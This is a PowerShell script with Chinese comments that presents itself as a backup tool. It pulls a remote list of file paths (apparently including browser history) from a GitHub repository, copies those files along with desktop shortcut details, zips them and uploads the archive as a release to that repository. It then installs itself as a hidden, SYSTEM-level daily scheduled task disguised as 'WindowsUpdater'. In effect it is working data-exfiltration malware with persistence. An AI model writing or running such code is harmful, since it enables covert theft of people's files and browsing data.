# 设置日志路径
$logPath = "$env:ProgramData\upload_log.txt"

function Log($msg, $fatal = $false) {
    $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
    try { $line | Out-File -FilePath $logPath -Append -Encoding UTF8 } catch {}
    Write-Host $line
    if ($fatal) {
        Start-Sleep -Seconds 15
        exit 1
    }
}

Log "===== EXECUTION START ====="

# 保存自身副本到固定路径
$localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
try {
    Invoke-RestMethod -Uri "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing -ErrorAction Stop
    Log "[OK] install.ps1 downloaded to $localPath"
} catch {
    Log "❌ Failed to download install.ps1: $($_.Exception.Message)" $true
}

# 设置 UTF-8
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# 读取环境变量 GITHUB_TOKEN
$token = $env:GITHUB_TOKEN
if (-not $token) {
    Log "❌ GITHUB_TOKEN 环境变量不存在" $true
}
Log "[OK] GITHUB_TOKEN 存在"

# 初始化变量
$repo = "drftghy/backup-files"
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot = "$env:TEMP\package-$computerName-$timestamp"
$zipName = "package-$computerName-$timestamp.zip"
$zipPath = Join-Path $env:TEMP $zipName
New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

# STEP 1: 获取上传路径列表
$remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
try {
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
    Log "[OK] 读取上传路径列表成功，共 $($pathList.Count) 项"
} catch {
    Log "❌ 无法加载路径列表: $($_.Exception.Message)" $true
}

# STEP 2: 复制目标路径文件
$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"
    if (-not (Test-Path $path)) { continue }

    $dest = Join-Path $tempRoot $name
    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
        }
        Log "[OK] 拷贝 $path 成功"
    } catch {
        Log "⚠️ 拷贝失败: $path => $($_.Exception.Message)"
    }
}

# STEP 3: 收集桌面快捷方式
try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
    $lnkReport = ""
    foreach ($lnk in $lnkFiles) {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        $lnkReport += "[$($lnk.Name)]`n"
        $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
        $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
        $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
        $lnkReport += "Icon:       $($shortcut.IconLocation)`n"
        $lnkReport += "-----------`n"
    }
    $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
    $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
    Log "[OK] 快捷方式信息已收集"
} catch {
    Log "⚠️ 快捷方式收集失败: $($_.Exception.Message)"
}

# STEP 4: 打包
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
    Log "[OK] 文件已压缩为 $zipName"
} catch {
    Log "❌ 压缩失败: $($_.Exception.Message)" $true
}

# STEP 5: 创建 Release
$releaseData = @{
    tag_name = $tag
    name = $releaseName
    body = "Auto backup from $computerName on $date"
    draft = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent" = "PowerShellScript"
    Accept = "application/vnd.github.v3+json"
}

try {
    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
    Log "[OK] GitHub Release 创建成功"
} catch {
    Log "❌ 创建 GitHub Release 失败: $($_.Exception.Message)" $true
}

# STEP 6: 上传压缩包
try {
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShellScript"
    }
    $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
    Log "[OK] 文件上传成功"
} catch {
    Log "❌ 上传失败: $($_.Exception.Message)" $true
}

# STEP 7: 清理
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
Log "[OK] 清理完成"

# STEP 8: 注册计划任务
$taskName = "WindowsUpdater"
$taskDescription = "Daily file package task"
$scriptPath = "C:\\ProgramData\\Microsoft\\Windows\\update.ps1"

try {
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        Log "[OK] 已删除旧任务"
    }

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -Daily -At 2:00am
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Principal $principal
    Log "[OK] 已注册计划任务（每天 2:00 AM）"
} catch {
    Log "❌ 注册计划任务失败: $($_.Exception.Message)" $true
}

Log "===== EXECUTION COMPLETE ====="
